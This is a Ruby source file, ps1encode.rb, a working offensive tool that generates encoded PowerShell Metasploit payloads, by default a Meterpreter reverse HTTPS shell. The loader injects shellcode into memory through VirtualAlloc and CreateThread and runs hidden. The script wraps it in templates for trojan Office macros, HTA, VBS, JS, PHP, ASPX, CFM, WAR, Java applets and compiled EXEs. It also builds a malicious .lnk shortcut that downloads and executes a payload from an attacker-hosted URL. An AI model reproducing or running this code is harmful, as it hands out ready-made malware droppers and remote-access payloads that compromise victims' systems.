#!/usr/bin/ruby
#
#    ps1encode.rb 
#
#    Use to generate and encode a powershell based metasploit payloads.
#
#    Writen by Piotr Marszalik - @addenial - peter.mars[at]outlook.com
#    orginal version - 05/08/2013
#    
#
#    Available output types:
# => raw (encoded payload only - no powershell run options)
# => cmd (for use with bat files)
# => vba (for use with macro trojan docs)
# => vbs (for use with vbs scripts)
# => war (tomcat)
# => exe (executable) requires MinGW - i586-mingw32msvc-gcc [apt-get install mingw32]
# => java (for use with malicious java applets)
# => js (javascript)
# => php (for use with php pages)
# => hta (HTML applications)
# => cfm (for use with Adobe ColdFusion)
# => aspx (for use with ASP.NET)
# => lnk (windows shortcut - requires a website to stage the payload)
#
#
#    Powershell code based on PowerSploit written by Matthew Graeber and SET by Dave Kennedy
#     DETAILS - http://rvnsec.wordpress.com/2014/09/01/ps1encode-powershell-for-days/
#

require 'optparse'
require 'base64'

options = {}

optparse = OptionParser.new do|opts|

    opts.banner = "Usage: ps1encode.rb --LHOST [default = 127.0.0.1] --LPORT [default = 443] --PAYLOAD [default = windows/meterpreter/reverse_https] --ENCODE [default = cmd]"
    opts.separator ""
    
    options[:LHOST] = "127.0.0.1"
    options[:LPORT] = "443"
    options[:PAYLOAD] = "windows/meterpreter/reverse_https"
    options[:ENCODE] = "cmd"

    opts.on('-i', '--LHOST VALUE', "Local host IP address") do |i|
        options[:LHOST] = i
    end
    
    opts.on('-p', '--LPORT VALUE', "Local host port number") do |p|
                options[:LPORT] = p
        end
    
    opts.on('-a', '--PAYLOAD VALUE', "Payload to use") do |a|
                options[:PAYLOAD] = a
        end

    opts.on('-t', '--ENCODE VALUE', "Output format: raw, cmd, vba, vbs, war, exe, java, js, php, hta, cfm, aspx, lnk") do |t|
                options[:ENCODE] = t
        end
    opts.separator ""
end

if ARGV.empty?
  puts optparse
  exit
else
  optparse.parse!
end

$lhost = options[:LHOST]
$lport = options[:LPORT]
$lpayload = options[:PAYLOAD]
$lencode = options[:ENCODE]

#string byte to hex
class String
  def to_hex
    #"0x" + self.to_i.to_s(16)
    sprintf("0x%02x", self.to_i)
  end
end

def gen_PS_shellcode()

    results = []
    resultsS = ""

    #generate the shellcode via msfvenom and write to a temp txt file
    system("msfvenom -p #{$lpayload} LHOST=#{$lhost} LPORT=#{$lport} -s 341 -f raw > raw_shellcode_temp")

    #taking raw shellcode, each byte goes into array
    File.open('raw_shellcode_temp').each_byte do |b|
        results << b
    end

    #remove temp
    system("rm raw_shellcode_temp")

    #go through the array, convert each byte in the array to a hex string
    results.each do |i|
        resultsS = resultsS + i.to_s.to_hex + ","
    end

    #remove last unnecessary comma
    resultsS = resultsS.chop
    
    #powershell script to be executed pre-encode
    finstring = "$1 = '$c = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = #{resultsS};$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";$cmd = \"-nop -noni -enc \";iex \"& $x86 $cmd $gq\"}else{$cmd = \"-nop -noni -enc\";iex \"& powershell $cmd $gq\";}"

    #convert to UTF-16 (powershell interprets base64 of UTF-16)
    ec = Encoding::Converter.new("UTF-8", "UTF-16LE")
    utfEncoded =  ec.convert(finstring)

    #string to base64 - final
    finPS = Base64.encode64(utfEncoded).gsub(/\n/, '')
    
    return finPS
end


def prep_PS_chunk(ps_shellcode)
    #The below iterates through the string and chops up strings into 254 character lengths & puts it into a 2-dimensional array   
    splitup = []
    splitup = ps_shellcode.scan(/.{1,254}/)

    stringCommands=""
    varFinal="stringFinal=stringA+stringB+"

    splitup = splitup.flatten  #make the 2-dimensional array 1-dimensional to easier iterate
    splitup.each_with_index do |val, index|   #cycle through the array and create the strings for VBA
        val=val.tr '"',''  #strip out any prior quotes in the command
        stringCommands = stringCommands+"string#{index}=\"#{val}\"\n"
        varFinal=varFinal+"string#{index}+"
    end

    varFinal=varFinal[0..-2]  #create the final command that will be executed, this removes the "+" sign from the last command
    return stringCommands + "\n" + varFinal
end 

###########################RAW_ENCODE###########################
if $lencode == "raw"

    powershell_encoded = gen_PS_shellcode()
    puts powershell_encoded

end

##########################CMD_ENCODE###########################
if $lencode == "cmd"

    powershell_encoded = gen_PS_shellcode()
    puts "powershell -nop -win Hidden -noni -enc " + powershell_encoded

end

########################VBA_ENCODE###############################
if $lencode == "vba"

    powershell_encoded = gen_PS_shellcode()
    prepped_powershell_encoded = prep_PS_chunk(powershell_encoded)

#final VBA template
vbaTEMPLATE = %{Sub Auto_Open()

stringA = "power"
stringB = "shell.exe -NoE -NoP -NonI -W Hidden -E "
            
#{prepped_powershell_encoded}

    Shell stringFinal, 0
End Sub

Sub AutoOpen()
        Auto_Open
End Sub
Sub Workbook_Open()
        Auto_Open
End Sub
}
    puts vbaTEMPLATE

end

######################VBS_ENCODE###############################
if $lencode == "vbs"

powershell_encoded = gen_PS_shellcode()

vbsTEMPLATE = %{Set objShell = CreateObject("Wscript.Shell")
objShell.Run "cmd.exe /c powershell -nop -win Hidden -noni -enc #{powershell_encoded}", 0
}

puts vbsTEMPLATE

end

########################WAR_ENCODE###############################
if $lencode == "war"

    powershell_encoded = gen_PS_shellcode()

warTEMPLATE = %{<%@ page import="java.io.*" %>
<html>
<head>
<title>Sample</title>
</head>
<body>
<%
String yourCommand[]=\{"cmd.exe" ,"/C", " powershell -nop -win Hidden -noni -enc #{powershell_encoded} "\};
try \{
Process p = Runtime.getRuntime().exec(yourCommand);
BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream()));
\} catch (IOException ioe) \{
System.err.println("\\n\\n\\nIOException: "+ ioe.toString());
\}
%> 
</body>
</html>
}

#web.xml - saved within WEB-INF directory
webxmlTEMPLATE = %{<?xml version="1.0"?>
<!DOCTYPE web-app PUBLIC
"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
"http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app>
<servlet>
<servlet-name>Sample</servlet-name>
<jsp-file>/sample.jsp</jsp-file>
</servlet>
</web-app>
}


#temp dir - write in jsp file
system("mkdir wartemp")

jsp_file_temp = File.new("wartemp/sample.jsp", "w")
jsp_file_temp.write(warTEMPLATE)
jsp_file_temp.close

#new WEB-INF directory, write in web.xml
system("mkdir wartemp/WEB-INF")

webxml_file_temp = File.new("wartemp/WEB-INF/web.xml", "w")
webxml_file_temp.write(webxmlTEMPLATE)
webxml_file_temp.close

#Create JAR file
system("jar -cvf sample.war -C wartemp/ .")

#clean up
system("rm -r wartemp")

end

########################EXE_ENCODE###############################
if $lencode == "exe"

#determine if MinGW has been installed, support new and old MinGW system paths
mingw = true if File::exists?('/usr/i586-mingw32msvc') || File::exists?('/usr/bin/i586-migw32msvc')
if mingw == false
    puts "Must have MinGW installed in order to compile EXEs!!"
    puts "\n\tRun to download: apt-get install mingw32 \n"
    exit 1
end

    powershell_encoded = gen_PS_shellcode()

exeTEMPLATE = %{#include <stdio.h>
#include <stdlib.h>

int main()
\{
    system("powershell -nop -win Hidden -noni -enc #{powershell_encoded}");
    return 0;
\}

}

#write out to a new file
c_file_temp = File.new("c_file_temp.c", "w")
c_file_temp.write(exeTEMPLATE)
c_file_temp.close
   
#compiling will require MinGW installed - "apt-get install mingw32"
puts "compiling..."

system("i586-mingw32msvc-gcc c_file_temp.c -o final_.exe")
system("rm c_file_temp.c")

puts "final_.exe created!"

end

########################JAVA_ENCODE###############################
if $lencode == "java"

powershell_encoded = gen_PS_shellcode()

javaTEMPLATE = %{import java.applet.*;
import java.awt.*;
import java.io.*;
public class Java extends Applet \{
public void init() \{
Process f;

String cmd = "cmd.exe /c powershell -nop -win Hidden -noni -enc #{powershell_encoded}";
try \{
f = Runtime.getRuntime().exec(cmd);
\}
catch(IOException e) \{
e.printStackTrace();
\}
Process s;
\}
\}
}

puts javaTEMPLATE

end

########################JS_ENCODE###############################
if $lencode == "js"

powershell_encoded = gen_PS_shellcode()

jsTEMPLATE = %{var objShell = new ActiveXObject("WScript.shell");
objShell.run("cmd.exe /c powershell -nop -win Hidden -noni -enc #{powershell_encoded}", 0);
}

puts jsTEMPLATE

end

######################PHP_ENCODE###############################
if $lencode == "php"

powershell_encoded = gen_PS_shellcode()

phpTEMPLATE = %{<?php
system("cmd.exe /c powershell -nop -win Hidden -noni -enc #{powershell_encoded}");
?>
}

puts phpTEMPLATE

end

######################HTA_ENCODE###############################
if $lencode == "hta"

powershell_encoded = gen_PS_shellcode()

htaTEMPLATE = %{<html> 
<head> 
<script language="VBScript"> 
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "cmd.exe /c powershell -nop -win Hidden -noni -enc #{powershell_encoded}", 0
</script> 
</head> 
<body> 
<!-- info -->
</body> 
</html>
}

puts htaTEMPLATE

end

######################CFM_ENCODE###############################
if $lencode == "cfm"

powershell_encoded = gen_PS_shellcode()

cfmTEMPLATE = %{<cfexecute name = "C:\\Windows\\System32\\cmd.exe"
   arguments = "/c powershell -nop -win Hidden -noni -enc #{powershell_encoded}"
   timeout = "10">
</cfexecute>
}

puts cfmTEMPLATE

end

######################ASPX_ENCODE##############################
if $lencode == "aspx"

powershell_encoded = gen_PS_shellcode()

aspxTEMPLATE = %{
<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
	private void Page_Load(object sender, System.EventArgs e){
		System.Diagnostics.Process process = new System.Diagnostics.Process();
		process.StartInfo.FileName = "powershell.exe";
		process.StartInfo.Arguments = " -nop -win Hidden -noni -enc #{powershell_encoded}";
		process.Start();
	}
</script>
}

puts aspxTEMPLATE

end

######################LNK_ENCODE##############################
if $lencode == "lnk"

# Shortcut command has length limitations of 259 characters. Need to stage the payload. 
stageURL = String.new

puts "This encoding format requires staging"
puts "Enter the full URL on which the payload will be hosted:"
stageURL = gets.chomp!


lnkTEMPLATE = "-nop -win Hidden -noni -command \"IEX (New-Object Net.WebClient).DownloadString('#{stageURL}')\""

# Converting string to an array of char and to HEX
lnkTEMPLATE_AR = lnkTEMPLATE.split(//)
lnkTEMPLATE_AR.each_with_index {|val, index| 
lnkTEMPLATE_AR[index] = val.unpack('H*') } 

lnkTEMPLATE_fin = lnkTEMPLATE_AR.join(" 00 ")


# Pulling the length of the command
lnkLENGTH = lnkTEMPLATE.length
# To Hex
lnkLENGTH = lnkLENGTH.to_s(16)


# Windows shortcut HEX template array
lnkPAYLOAD = "4C 00 00 00 01 14 02 00 00 00 00 00 C0 00 00 00 00 00 00 46 BB 00 08 00 20 00 00 00 12 27 43 C8 FF BA D0 01 12 27 43 C8 FF BA D0 01 12 27 43 C8 FF BA D0 01 00 86 07 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 05 02 14 00 1F 50 E0 4F D0 20 EA 3A 69 10 A2 D8 08 00 2B 30 30 9D 19 00 2F 43 3A 5C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 56 00 31 00 00 00 00 00 6F 47 E2 2C 10 00 57 69 6E 64 6F 77 73 00 40 00 09 00 04 00 EF BE EA 46 AF 48 6F 47 E2 2C 2E 00 00 00 99 33 00 00 00 00 11 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 EA A9 0C 01 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 00 00 16 00 5A 00 31 00 00 00 00 00 7A 47 34 11 10 00 53 79 73 74 65 6D 33 32 00 00 42 00 09 00 04 00 EF BE EA 46 AF 48 7A 47 34 11 2E 00 00 00 07 92 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 4C 2B 21 00 53 00 79 00 73 00 74 00 65 00 6D 00 33 00 32 00 00 00 18 00 6C 00 31 00 00 00 00 00 EA 46 8C 58 10 00 57 49 4E 44 4F 57 7E 31 00 00 54 00 09 00 04 00 EF BE EA 46 8C 58 EA 46 8C 58 2E 00 00 00 6F 96 00 00 00 00 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 E4 AF 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 50 00 6F 00 77 00 65 00 72 00 53 00 68 00 65 00 6C 00 6C 00 00 00 18 00 4E 00 31 00 00 00 00 00 FB 46 B5 24 14 00 76 31 2E 30 00 00 3A 00 09 00 04 00 EF BE EA 46 8C 58 FB 46 B5 24 2E 00 00 00 70 96 00 00 00 00 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 8D 91 06 00 76 00 31 00 2E 00 30 00 00 00 14 00 6C 00 32 00 00 86 07 00 EA 46 31 58 20 00 70 6F 77 65 72 73 68 65 6C 6C 2E 65 78 65 00 00 4E 00 09 00 04 00 EF BE EA 46 31 58 EA 46 31 58 2E 00 00 00 D8 35 01 00 00 00 03 00 00 00 00 00 91 00 00 00 00 00 00 00 00 00 EE 93 6A 00 70 00 6F 00 77 00 65 00 72 00 73 00 68 00 65 00 6C 00 6C 00 2E 00 65 00 78 00 65 00 00 00 1E 00 00 00 68 00 00 00 1C 00 00 00 01 00 00 00 1C 00 00 00 2D 00 00 00 00 00 00 00 67 00 00 00 11 00 00 00 03 00 00 00 2E 4A 5C C4 10 00 00 00 00 43 3A 5C 57 69 6E 64 6F 77 73 5C 53 79 73 74 65 6D 33 32 5C 57 69 6E 64 6F 77 73 50 6F 77 65 72 53 68 65 6C 6C 5C 76 31 2E 30 5C 70 6F 77 65 72 73 68 65 6C 6C 2E 65 78 65 00 00 3F 00 2E 00 2E 00 5C 00 2E 00 2E 00 5C 00 2E 00 2E 00 5C 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 5C 00 53 00 79 00 73 00 74 00 65 00 6D 00 33 00 32 00 5C 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 50 00 6F 00 77 00 65 00 72 00 53 00 68 00 65 00 6C 00 6C 00 5C 00 76 00 31 00 2E 00 30 00 5C 00 70 00 6F 00 77 00 65 00 72 00 73 00 68 00 65 00 6C 00 6C 00 2E 00 65 00 78 00 65 00 2A 00 43 00 3A 00 5C 00 57 00 49 00 4E 00 44 00 4F 00 57 00 53 00 5C 00 53 00 79 00 73 00 74 00 65 00 6D 00 33 00 32 00 5C 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 50 00 6F 00 77 00 65 00 72 00 53 00 68 00 65 00 6C 00 6C 00 5C 00 76 00 31 00 2E 00 30 00 07 00 #{lnkTEMPLATE_fin} 00 10 00 00 00 05 00 00 A0 25 00 00 00 DD 00 00 00 1C 00 00 00 0B 00 00 A0 77 4E C1 1A E7 02 5D 4E B7 44 2E B1 AE 51 98 B7 DD 00 00 00 60 00 00 00 03 00 00 A0 58 00 00 00 00 00 00 00 77 69 6E 2D 76 73 70 63 2D 63 63 63 73 00 00 00 F4 DA 8A FA 50 6C 16 4E B6 D1 F4 76 95 D3 4E 6C 33 B4 25 CD 3B 92 E5 11 AC 09 00 0C 29 C0 A1 48 F4 DA 8A FA 50 6C 16 4E B6 D1 F4 76 95 D3 4E 6C 33 B4 25 CD 3B 92 E5 11 AC 09 00 0C 29 C0 A1 48 CC 00 00 00 02 00 00 A0 07 00 F5 00 78 00 29 23 78 00 1E 00 00 00 00 00 00 00 00 00 00 00 00 00 06 00 0C 00 36 00 00 00 90 01 00 00 43 00 6F 00 6E 00 73 00 6F 00 6C 00 61 00 73 00 00 00 00 00 31 00 35 00 00 00 F0 87 FD 7F 00 00 00 00 00 00 00 00 00 00 00 00 F0 87 FD 7F 00 00 00 00 00 00 00 00 00 00 03 00 01 00 00 00 00 00 19 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 32 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 80 00 00 00 80 80 00 80 00 00 00 80 00 80 00 80 80 00 00 C0 C0 C0 00 80 80 80 00 00 00 FF 00 00 FF 00 00 00 FF FF 00 FF 00 00 00 FF 00 FF 00 FF FF 00 00 FF FF FF 00 2F 03 00 00 09 00 00 A0 89 00 00 00 31 53 50 53 ED 30 BD DA 43 00 89 47 A7 F8 D0 13 A4 73 66 22 6D 00 00 00 64 00 00 00 00 1F 00 00 00 2D 00 00 00 76 00 31 00 2E 00 30 00 20 00 28 00 43 00 3A 00 5C 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 5C 00 53 00 79 00 73 00 74 00 65 00 6D 00 33 00 32 00 5C 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 50 00 6F 00 77 00 65 00 72 00 53 00 68 00 65 00 6C 00 6C 00 29 00 00 00 00 00 00 00 00 00 89 00 00 00 31 53 50 53 E2 8A 58 46 BC 4C 38 43 BB FC 13 93 26 98 6D CE 6D 00 00 00 04 00 00 00 00 1F 00 00 00 2E 00 00 00 53 00 2D 00 31 00 2D 00 35 00 2D 00 32 00 31 00 2D 00 32 00 36 00 31 00 32 00 39 00 37 00 35 00 35 00 36 00 2D 00 31 00 34 00 34 00 33 00 35 00 34 00 38 00 39 00 38 00 31 00 2D 00 34 00 32 00 34 00 37 00 30 00 38 00 38 00 39 00 31 00 33 00 2D 00 31 00 30 00 30 00 30 00 00 00 00 00 00 00 82 00 00 00 31 53 50 53 07 06 57 0C 96 03 DE 43 9D 61 E3 21 D7 DF 50 26 11 00 00 00 03 00 00 00 00 0B 00 00 00 FF FF 00 00 11 00 00 00 01 00 00 00 00 0B 00 00 00 FF FF 00 00 11 00 00 00 02 00 00 00 00 0B 00 00 00 FF FF 00 00 11 00 00 00 04 00 00 00 00 0B 00 00 00 00 00 00 00 11 00 00 00 06 00 00 00 00 02 00 00 00 FF 00 00 00 11 00 00 00 05 00 00 00 00 0B 00 00 00 FF FF 00 00 00 00 00 00 B5 00 00 00 31 53 50 53 30 F1 25 B7 EF 47 1A 10 A5 F1 02 60 8C 9E EB AC 31 00 00 00 0A 00 00 00 00 1F 00 00 00 0F 00 00 00 70 00 6F 00 77 00 65 00 72 00 73 00 68 00 65 00 6C 00 6C 00 2E 00 65 00 78 00 65 00 00 00 00 00 15 00 00 00 0F 00 00 00 00 40 00 00 00 00 BB AD C8 FF BA D0 01 15 00 00 00 0C 00 00 00 00 15 00 00 00 00 86 07 00 00 00 00 00 29 00 00 00 04 00 00 00 00 1F 00 00 00 0C 00 00 00 41 00 70 00 70 00 6C 00 69 00 63 00 61 00 74 00 69 00 6F 00 6E 00 00 00 15 00 00 00 0E 00 00 00 00 40 00 00 00 12 27 43 C8 FF BA D0 01 00 00 00 00 A1 00 00 00 31 53 50 53 A6 6A 63 28 3D 95 D2 11 B5 D6 00 C0 4F D9 18 D0 85 00 00 00 1E 00 00 00 00 1F 00 00 00 3A 00 00 00 43 00 3A 00 5C 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 5C 00 53 00 79 00 73 00 74 00 65 00 6D 00 33 00 32 00 5C 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 50 00 6F 00 77 00 65 00 72 00 53 00 68 00 65 00 6C 00 6C 00 5C 00 76 00 31 00 2E 00 30 00 5C 00 70 00 6F 00 77 00 65 00 72 00 73 00 68 00 65 00 6C 00 6C 00 2E 00 65 00 78 00 65 00 00 00 00 00 00 00 39 00 00 00 31 53 50 53 B1 16 6D 44 AD 8D 70 48 A7 48 40 2E A4 3D 78 8C 1D 00 00 00 68 00 00 00 00 48 00 00 00 4A C3 71 0C E8 87 50 4A 9B 88 AA 25 23 1D B9 07 00 00 00 00 00 00 00 00 00 00 00 00".split(" ")

# block 391 hex, equivilent to 913 in decimal
# reversing .lnk files, the hex value of 913 equals to the length of our command
lnkPAYLOAD[913] = lnkLENGTH

# join the array and create a final hex string
lnkPAYLOADstream = lnkPAYLOAD.join("")

def hex_to_bin(s)
 s.scan(/../).map { |x| x.hex.chr }.join
end

outLNKfile = hex_to_bin(lnkPAYLOADstream)

File.binwrite("file.lnk", outLNKfile)

puts "Payload created! - file.lnk\n\n"


powershell_encoded = gen_PS_shellcode()
puts "-------------copy the below code and host it on #{stageURL}--------------"
puts "powershell -nop -win Hidden -noni -enc #{powershell_encoded}"

end
